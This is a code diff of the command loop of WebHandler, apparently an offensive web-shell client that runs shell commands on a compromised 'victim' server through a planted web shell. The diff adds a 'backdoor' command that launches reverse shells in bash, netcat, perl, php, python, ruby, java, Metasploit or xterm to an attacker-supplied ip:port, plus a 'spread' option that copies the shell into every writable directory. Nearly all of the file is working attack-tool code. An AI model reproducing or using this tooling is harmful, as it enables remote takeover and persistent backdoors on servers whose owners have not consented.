@@ -11,29 +11,29 @@ else:
 from core.libs.menu import Colors, banner
 from core.libs.request_handler import make_request
 from core.modules.info import info
-from core.modules.shell_handler import shell_handler
+from core.modules.backdoor import backdoor
 from core.modules.file_handler import file_handler
 from core.modules.enumerate import enumerate
 
 
 class Commander(object):
     '''
-    Class to execute commands on the victim server
+    Class to execute commands on the target
     '''
     def BackConnect(self):
         self.cwd = info.cwd
         i = 1
-        # empty list to save attacker's pushed commands
+        # Empty list to save attacker's pushed commands
         history = []
         while True:
             try:
                 try:
-                    # getting command to be executed from the user
+                    # Getting command to be executed from the user
                     command = raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=info.current_user,
                         red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
                         host_ip=info.host_ip.split(',')[0],
                         cwd=self.cwd))
-                # if something went wrong screw the list
+                # If something went wrong screw the list
                 except IndexError:
                     command = raw_input('WebHandler@server:$ ')
 
@@ -42,31 +42,61 @@ class Commander(object):
                     if command == 'clear':
                         Popen('clear', shell=True).wait()
 
-                    # getting all commands attackr's did on the server
+                    # Getting all commands attackr's did on the server
                     elif command == 'history':
                         x = 1
                         for command in history:
                             print '{0:2d} {1}'.format(x, command)
                             x += 1
 
-                    # execute the command on the attacker's box if ! provided
-                    # at the first of the command
+                    # Execute the command on the attacker's box if '!' provided at the first of the command
                     elif command.startswith('!'):
                         Popen(command[1:], shell=True).wait()
 
-                    # get stored info from
+                    # Get stored info from
                     elif command == 'info':
                         info.get_information()
 
-                    # get WebHandler banner
+                    # Update WebHandler
+                    elif command == 'update':
+                        info.update()
+
+                    # Get WebHandler banner
                     elif command == 'banner':
                         print banner
 
-                    # spreat the shell to all writable directories
-                    elif command == 'spread':
-                        shell_handler.spread_shell()
+                    elif command.startswith('backdoor'):
+                        if len(command.split()) == 3:
+                            ip = command.split()[2].split(':')[0]
+                            port = command.split()[2].split(':')[1]
+                            if command.split()[1] == "bash":
+                                backdoor.bash(ip, port)
+                            elif command.split()[1] == "java":
+                                backdoor.java(ip, port)
+                            elif command.split()[1] == "msf":
+                                backdoor.msf(ip, port)
+                            elif command.split()[1] == "netcat":
+                                backdoor.netcat(ip, port)
+                            elif command.split()[1] == "perl":
+                                backdoor.perl(ip, port)
+                            elif command.split()[1] == "php":
+                                backdoor.php(ip, port)
+                            elif command.split()[1] == "python":
+                                backdoor.python(ip, port)
+                            elif command.split()[1] == "ruby":
+                                backdoor.ruby(ip, port)
+                            elif command.split()[1] == "xterm":
+                                backdoor.xterm(ip)
+                            else:
+                                backdoor.list()
+                        elif len(command.split()) == 2:
+                            if command.split()[1] == "spread":
+                                backdoor.spread()
+                            else:
+                                backdoor.list()
+                        else:
+                            backdoor.list()
 
-                    # displays the target's 'health' (CPU, Memory usage etc)
                     elif command.startswith('enum'):
                         if len(command.split()) == 2:
                             if command.split()[1] == "health":
@@ -88,7 +118,7 @@ class Commander(object):
 
                     elif command.startswith('download'):
                         if len(command.split()) < 2:
-                            print '\n[!] Usage: download [remote_file_path] [local_file_path| <optional argument>]'
+                            print '\n[!] Usage: download [remote_file_path] <local_file_path>'
                         else:
                             rfile_path = command.split()[1]
                             if len(command.split()) == 2:
@@ -117,7 +147,7 @@ class Commander(object):
                                         if make_request.get_page_source(cmd)[0] == 'is_valid':
                                             self.cwd = command.split()[-1]
                                         else:
-                                            print 'bash: cd: {}: No such file or directory'.format(command.split()[-1])
+                                            print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])
                                     else:
                                         cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command.split()[-1])
                                         if make_request.get_page_source(cmd)[0] == 'is_valid':
@@ -129,8 +159,8 @@ class Commander(object):
                                 self.cwd = info.cwd  # dirty patch
 
                             else:
-                                # setting aliases for some commands to avoid
-                                # issues realted to empty directories
+                                # Setting aliases for some commands to avoid
+                                # Issues realted to empty directories
                                 command = command.replace('ls', 'ls -lha') if command.split()[0] == 'ls' else command
                                 command = command.replace('rm', 'rm -v') if command.split()[0] == 'rm' else command
                                 command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
@@ -138,15 +168,15 @@ class Commander(object):
 
                                 cmd = 'cd {0};{1}'.format(self.cwd, command)
 
-                                # get the source code cotenets
+                                # Get the source code cotenets
                                 source = make_request.get_page_source(cmd)
                                 if source:
                                     for line in source:
                                         print line
 
-                                # if the executed command doesn't exist
+                                # If the executed command doesn't exist
                                 else:
-                                    errmsg = '{}: command not found'.format(unquote(command))
+                                    errmsg = '{0}: command not found'.format(unquote(command))
                                     if command.split()[0] == 'echo':
                                         pass
                                     else:
@@ -154,16 +184,16 @@ class Commander(object):
                         except IndexError:
                             pass
 
-                # exist WebHandler if user provides exit as a command
+                # Exit WebHandler if user provides exit as a command
                 else:
-                    print '\n[+] Preformed "{}" commands on the server\n[!] Connection closed'.format(i)
+                    print '\n[+] Preformed "{0}" commands on the server, {1}\n[!] Connection closed'.format(i, info.host_ip.split(',')[0])
                     break
 
-            # exit WebHandler if it recieved a break (^c)
+            # Exit WebHandler if it recieved a break (^c)
             except KeyboardInterrupt:
-                print '\n\n[+] Preformed "{}" commands on the server\n[!] Connection closed'.format(i)
+                print '\n[+] Preformed "{0}" commands on the server, {1}\n[!] Connection closed'.format(i, info.host_ip.split(',')[0])
                 break
             i += 1
 
-# taking an instance from the main class
+# Taking an instance from the main class
 commander = Commander()
